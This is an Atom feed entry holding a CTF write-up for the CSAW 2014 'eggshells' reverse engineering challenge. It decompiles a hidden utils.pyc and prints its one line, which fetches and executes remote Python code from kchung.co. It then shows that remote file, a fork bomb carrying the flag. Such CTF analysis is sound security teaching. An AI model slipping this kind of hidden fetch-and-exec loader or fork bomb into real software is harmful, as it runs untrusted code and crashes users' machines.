<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/uncompyle2.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-09-22T09:20:00-04:00</updated><entry><title>CSAW CTF 2014 - Reverse Engineering 100: "eggshells"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-reverse-engineering-100-eggshells.html" rel="alternate"></link><updated>2014-09-22T09:20:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-22:csaw-ctf-2014-reverse-engineering-100-eggshells.html</id><summary type="html">&lt;p&gt;This is the first exploitation problem and it starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I trust people on the Internet all the time, do you?&lt;/p&gt;
&lt;p&gt;Written by ColdHeat&lt;/p&gt;
&lt;p&gt;eggshells-master.zip&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Unzipping and Analyzing the Files&lt;/h2&gt;
&lt;p&gt;Let’s unzip the provided zip file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;unzip eggshells-master.zip
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This creates a directory called &lt;em&gt;eggshells-master&lt;/em&gt; that contains several &lt;em&gt;Python&lt;/em&gt; and &lt;em&gt;exe&lt;/em&gt; files. Let us look closer to the contend of this folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;tree .
├── capstone.py
├── distorm.py
├── interpreter.py
├── main.py
├── nasm
│   ├── LICENSE
│   ├── nasm.exe
│   ├── ndisasm.exe
│   └── rdoff
│       ├── ldrdf.exe
│       ├── rdf2bin.exe
│       ├── rdf2com.exe
│       ├── rdf2ihx.exe
│       ├── rdf2ith.exe
│       ├── rdf2srec.exe
│       ├── rdfdump.exe
│       ├── rdflib.exe
│       └── rdx.exe
├── nasm.py
├── server.py
├── shellcode.py
├── utils.pyc
└── wrapper.py
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Do you see anything unusual?&lt;/p&gt;
&lt;h2&gt;Decompiled a pre-compiled Python File&lt;/h2&gt;
&lt;p&gt;A pre-compiled Python file stands out in this list: &lt;em&gt;utils.pyc&lt;/em&gt;. We need to decompile it. For this task we use  &lt;a href="https://github.com/gstarnberger/uncompyle"&gt;uncompyle2&lt;/a&gt;, which can be installed with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;sudo pip install uncompyle2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's learn a bit more about this tool with &lt;code&gt;uncompyle2 --help&lt;/code&gt;. The usage is straightfoward, but it's a good knowledge to learn about the &lt;em&gt;-o&lt;/em&gt; flag, which will decompile to a &lt;em&gt;.dis&lt;/em&gt; file instead of &lt;em&gt;stdout&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;Usage: uncompyle2 &lt;span class="o"&gt;[&lt;/span&gt;OPTIONS&lt;span class="o"&gt;]&lt;/span&gt;... &lt;span class="o"&gt;[&lt;/span&gt; FILE | DIR&lt;span class="o"&gt;]&lt;/span&gt;...

Examples:
  uncompyle2      foo.pyc bar.pyc       &lt;span class="c"&gt;# decompile foo.pyc, bar.pyc to stdout&lt;/span&gt;
  uncompyle2 -o . foo.pyc bar.pyc       &lt;span class="c"&gt;# decompile to ./foo.dis and ./bar.dis&lt;/span&gt;
  uncompyle2 -o /tmp /usr/lib/python1.5 &lt;span class="c"&gt;# decompile whole library&lt;/span&gt;

Options:
  -o &amp;lt;path&amp;gt;     output decompiled files to this path:
                &lt;span class="k"&gt;if &lt;/span&gt;multiple input files are decompiled, the common prefix
                is stripped from these names and the remainder appended to
                &amp;lt;path&amp;gt;
                  uncompyle -o /tmp bla/fasel.pyc bla/foo.pyc
                    -&amp;gt; /tmp/fasel.dis, /tmp/foo.dis
                  uncompyle -o /tmp bla/fasel.pyc bar/foo.pyc
                    -&amp;gt; /tmp/bla/fasel.dis, /tmp/bar/foo.dis
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We could also use &lt;em&gt;.py&lt;/em&gt; extension if we like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;  --py          use &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt; extension &lt;span class="k"&gt;for &lt;/span&gt;generated files
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Also, we learn about all the possible outputs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt; Extensions of generated files:
  &lt;span class="s1"&gt;&amp;#39;.pyc_dis&amp;#39;&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;.pyo_dis&amp;#39;&lt;/span&gt;   successfully decompiled &lt;span class="o"&gt;(&lt;/span&gt;and verified &lt;span class="k"&gt;if&lt;/span&gt; --verify&lt;span class="o"&gt;)&lt;/span&gt;
  &lt;span class="s1"&gt;&amp;#39;.py&amp;#39;&lt;/span&gt;                   with --py option
    + &lt;span class="s1"&gt;&amp;#39;_unverified&amp;#39;&lt;/span&gt;       successfully decompile but --verify failed
    + &lt;span class="s1"&gt;&amp;#39;_failed&amp;#39;&lt;/span&gt;           uncompyle failed &lt;span class="o"&gt;(&lt;/span&gt;contact author &lt;span class="k"&gt;for &lt;/span&gt;enhancement&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, no more diverging. Let's play! We run the &lt;code&gt;uncompyle2&lt;/code&gt; command and obtain the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt;uncompyle2 utils.pyc
&lt;span class="c"&gt;#Embedded file name: /Users/kchung/Desktop/CSAW Quals 2014/rev100/utils.py&lt;/span&gt;
&lt;span class="nb"&gt;exec &lt;/span&gt;__import__&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.urlopen&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;.read&lt;span class="o"&gt;()&lt;/span&gt;
+++ okay decompyling utils.pyc
&lt;span class="c"&gt;# decompiled 1 files: 1 okay, 0 failed, 0 verify failed&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Parsing the Result and Voilà&lt;/h2&gt;
&lt;p&gt;So all that this file does is in this line:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;exec&lt;/span&gt; &lt;span class="nb"&gt;__import__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;urllib2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urlopen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;#39;http://kchung.co/lol.py&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To understand this code, we need to know that Python's &lt;a href="https://docs.python.org/2/reference/simple_stmts.html#exec"&gt;exec&lt;/a&gt; method performs dynamic execution of code.  In this problem, &lt;em&gt;exec&lt;/em&gt; starts importing &lt;a href="https://docs.python.org/2/library/urllib2.html#module-urllib2"&gt;urllib2&lt;/a&gt;, which is a library for opening URLs.  It has the method &lt;a href="https://docs.python.org/2/library/urllib2.html#urllib2.urlopen"&gt;urlopen()&lt;/a&gt; to open the URL url, which can be either a string or a request object. This function returns a file-like object with three additional methods. Finally, &lt;a href="http://www.tutorialspoint.com/python/file_read.htm"&gt;read()&lt;/a&gt; would read this returned file.&lt;/p&gt;
&lt;p&gt;So all that this script does is to try running a Python file that is hosted online!
Well, let's see what this file does! Let's just &lt;em&gt;curl&lt;/em&gt; &lt;a href="http://kchung.co/lol.py"&gt;http://kchung.co/lol.py&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nv"&gt;$ &lt;/span&gt; curl http://kchung.co/lol.py
import os
&lt;span class="k"&gt;while &lt;/span&gt;True:
    try:
        os.fork&lt;span class="o"&gt;()&lt;/span&gt;
    except:
        os.system&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;start&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="c"&gt;# flag{trust_is_risky}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yaaay! The flag is &lt;strong&gt;trust_is_risky&lt;/strong&gt;! Easy!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Hack all the things!&lt;/strong&gt;&lt;/p&gt;</summary><category term="CTF"></category><category term="CSAW"></category><category term="uncompyle2"></category></entry></feed>